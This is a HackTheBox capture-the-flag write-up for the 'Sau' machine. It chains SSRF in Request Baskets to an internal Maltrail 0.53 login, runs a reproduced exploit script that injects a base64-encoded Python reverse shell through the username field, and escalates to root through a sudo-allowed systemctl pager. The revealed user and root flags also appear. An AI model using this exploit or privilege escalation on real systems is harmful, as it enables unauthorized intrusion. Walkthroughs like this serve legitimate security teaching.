---
slug: sau
hide:
    - navigation
tags:
    - HackTheBox
    - Writeups
    - Walkthrough
    - Linux
    - Web
    - Maltrail
    - RCE
---

[:octicons-arrow-left-24: Back to HackTheBox Writeups](./index.md){ .sm-button }

# **Sau**

![](https://live.staticflickr.com/65535/53504554778_37dfd44416_c.jpg){loading=lazy}

??? info "Information"
    **Machine**: [Sau](https://app.hackthebox.com/machines/551)  
    **Level**: `Easy`  
    **Tags**: `Linux`, `Web`, `Maltrail`, `RCE`    
    **Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/551)  


---

## 🚀 **Starting**

```bash
echo 10.10.11.224 | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**


```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.224
```

```log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-25 06:18 EST
Nmap scan report for 10.10.11.224
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Mon, 25 Dec 2023 11:19:26 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Mon, 25 Dec 2023 11:18:56 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Mon, 25 Dec 2023 11:18:57 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=12/25%Time=6589651E%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Mon,\x2025\x20Dec
SF:\x202023\x2011:18:56\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=
SF:\"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\
SF:x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Mon,\x2025\x20Dec
SF:\x202023\x2011:18:57\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nDate:\x20Mon,\x2025\x20Dec\x202023\x2011:19:26\x20G
SF:MT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x2
SF:0name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250
SF:}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/25%OT=22%CT=1%CU=38978%PV=Y%DS=2%DC=T%G=Y%TM=658
OS:96598%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53C
OS:ST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1
OS:=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O
OS:=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   207.36 ms 10.10.14.1
2   207.62 ms 10.10.11.224

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.14 seconds
```

---

## 🪲 **Vulnerability Scan**

We can see in the Nmap results that the port `80` is filtered, we can also confirm by doing some `curl`:

```bash
curl -Ik http://sau.htb 
# No Response

curl -X OPTIONS -Ik http://sau.htb
# No Response

curl -X HEAD -Ik http://sau.htb
# No Response
```

This means that something is being served on `80` but not for public access. Let's check out the next door `55555` which is open:

```bash

curl -Ik http://sau.htb:55555
```
```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, OPTIONS
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Mon, 25 Dec 2023 13:54:06 GMT
Content-Length: 19
```

It just allow GET or OPTIONS methods

```bash
curl -X GET -LIk http://sau.htb:55555
```
```http
HTTP/1.1 302 Found
Content-Type: text/html; charset=utf-8
Location: /web
Date: Mon, 25 Dec 2023 14:44:23 GMT
Content-Length: 27

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 25 Dec 2023 14:44:23 GMT
Transfer-Encoding: chunked
```

As we can see it is redirecting to /web

```bash
curl -X GET -Ik http://sau.htb:55555/web
```
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 25 Dec 2023 18:23:45 GMT
Transfer-Encoding: chunked
```

Time to check this page through the browser

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703537869/blog/sau/izpcbpzufcae0ptmpl8t.png){.maxH300}

In this page we identify a web service named `Request Baskets` at version `1.2.1`, also there is a link to the project on Github.

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538051/blog/sau/p4tg67ecccc84avkmgim.png){.maxH300}

As its description says, it is a service for webhooks like the well-known `RequestBin`, let's try it to check its behavior. I am gonna create a "basket" (Web Hook)

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538339/blog/sau/kbwmuagm9ydreiiq90hn.png){.maxH300}

It gives a token to authenticate the created web hook

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538395/blog/sau/vhggobfhur3coukjrfny.png){.maxH300}

Then, we land on this dashboard screen

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538510/blog/sau/gfxvcs2kpi0gjerucwat.png){.maxH300}

Now, let's test its functionality by making a `GET` request to the created endpoint

```bash
curl -X GET -Ik http://sau.htb:55555/stl44dl
```
```http
HTTP/1.1 200 OK
Date: Mon, 25 Dec 2023 18:49:53 GMT
Content-Length: 0
```

It is logging as expected  
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538617/blog/sau/krzueiwmebqevno7itr9.png){.maxH300}

On the `cog-icon` we can access the "Configuration Settings", where we can see a field "Forward URL", we can try to create another web hook to see its behavior.  
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538730/blog/sau/zsmwfrqsaotwebw0kz7u.png){.maxH300}

I used `PipeDream`  
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538754/blog/sau/jeriypannw5ajwudysjm.png){.maxH300}

Setting it to `Request Baskets`  
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538778/blog/sau/qotkwyon2z2ph9ws1dte.png){.maxH300}

But, unlucky, we got a `502 Bad Gateway`, it indicates that the server, while acting as a gateway or proxy, received an invalid response from the upstream server. Which means it wont work this manner.  
```bash
curl -X GET -Ik http://sau.htb:55555/stl44dl
```
```http
HTTP/1.1 502 Bad Gateway
Content-Type: text/plain
Date: Mon, 25 Dec 2023 19:00:37 GMT
Content-Length: 155
```

We need a new approach, so, instead, we can try to look into local addresses. Do you remember that we couldn't access that `unknown` service on port `80`? Let's try to access it through this proxy forwarding feature. Also it is needed to set insecure TLS, since we have no TLS.

![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538806/blog/sau/xgvg9mpqimrogevfgkql.png){.maxH300}

Yay, we got a 200 OK! We are doing some progress here! Also, it is possible to fingerprint a new service `Server: Maltrail/0.53`. We must make some searching to discover what service is this.
```
curl -X GET -Ik http://sau.htb:55555/stl44dl

HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: close
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
Content-Type: text/html
Date: Mon, 25 Dec 2023 19:06:23 GMT
Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT
Server: Maltrail/0.53
Transfer-Encoding: chunked
```

On my research about "Maltrail 0.53", the first search result I got on google was [Weaponized Exploit for Maltrail v0.53 Unauthenticated OS Command Injection (RCE)](https://github.com/spookier/Maltrail-v0.53-Exploit), It seems now we have an attack vector.

---

## 🎯 **Exploit**

```python
'''
  ██████  ██▓███   ▒█████   ▒█████   ██ ▄█▀ ██▓▓█████  ██▀███  
▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓██▒▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▓███▄░ ▒██▒▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░▓██ █▄ ░██░▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒██▒ █▄░██░░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░ ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ▒ ░   ░     ░░   ░ 
      ░               ░ ░      ░ ░  ░  ░    ░     ░  ░   ░     
'''

import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

Looking through the exploit, we can understand that this service is vulnerable to "Remote Code Execution (RCE)". We can just create a payload and send it encoded in a `curl` request through the `username` parameter. Pretty simple. Let's test it.

On the attacker machine we set a `Netcat` listener on some port.
```bash
nc -lnvp 13337
listening on [any] 13337 ...
```

Running the exploit, using the crafted web hook url that we created.
```bash
./exploit.py 10.10.14.12 13337 http://sau.htb:55555/stl44dl
Running exploit on http://sau.htb:55555/stl44dl/login
```

We got a Reverse Shell connection!
```bash
listening on [any] 13337 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.224] 56134
$ whoami
whoami
puma
$ id     
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ uname -a
uname -a
Linux sau 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
$ python3 --version
python3 --version
Python 3.8.10
```

### **Netcat Stabilization**

```bash
$ which bash
which bash
/usr/bin/bash
$ python3 -c "import pty;pty.spawn('/usr/bin/bash');" && export TERM=xterm
python3 -c "import pty;pty.spawn('/usr/bin/bash');" && export TERM=xterm
puma@sau:/opt/maltrail$ ^Z
zsh: suspended  nc -lnvp 13337
puma@sau:/opt/maltrail$ ll
total 204
drwxr-xr-x 9 root root  4096 Jun 19  2023 ./
drwxr-xr-x 3 root root  4096 Jun 19  2023 ../
-rw-rw-r-- 1 root root   179 Jan 31  2023 .gitattributes
-rw-rw-r-- 1 root root    13 Jan 31  2023 .gitignore
-rw-rw-r-- 1 root root  6418 Jan 31  2023 CHANGELOG
-rw-rw-r-- 1 root root   711 Jan 31  2023 CITATION.cff
-rw-rw-r-- 1 root root  1131 Jan 31  2023 LICENSE
-rw-rw-r-- 1 root root 42844 Jan 31  2023 README.md
drwxrwxr-x 2 root root  4096 Jun 19  2023 core/
drwxrwxr-x 2 root root  4096 Jun 19  2023 docker/
-rw-r--r-- 1 root root  7205 Apr 15  2023 h
drwxrwxr-x 5 root root  4096 Jun 19  2023 html/
-rw-rw-r-- 1 root root   437 Jan 31  2023 maltrail-sensor.service
-rw-rw-r-- 1 root root   430 Jan 31  2023 maltrail-server.service
-rw-rw-r-- 1 root root  5810 Jan 31  2023 maltrail.conf
drwxrwxr-x 2 root root  4096 Jun 19  2023 misc/
drwxrwxr-x 2 root root  4096 Jun 19  2023 plugins/
-rw-rw-r-- 1 root root     9 Jan 31  2023 requirements.txt
-rwxrwxr-x 1 root root 63782 Jan 31  2023 sensor.py*
-rwxrwxr-x 1 root root  5101 Jan 31  2023 server.py*
drwxrwxr-x 4 root root  4096 Jun 19  2023 thirdparty/
drwxrwxr-x 5 root root  4096 Jun 19  2023 trails/
```

---

## 🏁 **Flag Exfiltration**

### **Searching for User Flag**

```bash
puma@sau:/opt/maltrail$ ls -la ~
total 32
drwxr-xr-x 4 puma puma 4096 Jun 19  2023 .
drwxr-xr-x 3 root root 4096 Apr 15  2023 ..
lrwxrwxrwx 1 root root    9 Apr 14  2023 .bash_history -> /dev/null
-rw-r--r-- 1 puma puma  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 puma puma 3771 Feb 25  2020 .bashrc
drwx------ 2 puma puma 4096 Apr 15  2023 .cache
drwx------ 3 puma puma 4096 Apr 15  2023 .gnupg
-rw-r--r-- 1 puma puma  807 Feb 25  2020 .profile
lrwxrwxrwx 1 puma puma    9 Apr 15  2023 .viminfo -> /dev/null
lrwxrwxrwx 1 puma puma    9 Apr 15  2023 .wget-hsts -> /dev/null
-rw-r----- 1 root puma   33 Dec 25 11:12 user.txt
puma@sau:/opt/maltrail$ cat ~/user.txt 
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### **Privilege Escalation**

Serving Linpeas to PrivEsc
```bash
python -m http.server                    
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.224 - - [25/Dec/2023 14:54:21] "GET /linpeas.sh HTTP/1.1" 200 -
```

After running it, we got this Low-hangging fruit  
![](https://res.cloudinary.com/dulldsqcl/image/upload/v1703538826/blog/sau/yr7kseim2vye35zlux1f.png){.maxH300}

```bash
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

puma@sau:~$ sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sshh!sh
# whoami
root
```

**Root Flag**
```bash
# ls -la /root
total 40
drwx------  6 root root 4096 Dec 25 11:12 .
drwxr-xr-x 20 root root 4096 Jun 19  2023 ..
lrwxrwxrwx  1 root root    9 Apr 15  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Jun 19  2023 .cache
lrwxrwxrwx  1 root root    9 Apr 15  2023 .lesshst -> /dev/null
drwxr-xr-x  3 root root 4096 Jun  8  2023 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Apr 14  2023 .ssh
-rw-r--r--  1 root root   39 Jun  8  2023 .vimrc
lrwxrwxrwx  1 root root    9 Apr 15  2023 .wget-hsts -> /dev/null
drwxr-xr-x  4 root root 4096 Jun 19  2023 go
-rw-r-----  1 root root   33 Dec 25 11:12 root.txt
# cat /root/root.txt
#* * * ALERT * * * * * * * * * * * * * * * * 
#* If you really want to see this flag, go * 
#* to FLAG CODES at the bottom of the page *
#* * * * * * * * * * * * * * * * * * * * * *
```

### Flag Codes
??? question "**Reveal Flags** 🏁"
    #### **User Flag**
        9868bd4416fe3c3bd159e45f9e2a4156
    #### **Root Flag**
        7b12778f721d463b1c14db007fd6ea99

---

#### *If this was helpful in someway, [you can **support me** by zapping me some sats](https://getalby.com/p/0xrh0d4m1n)!*
#### *See you in the next writeup!*

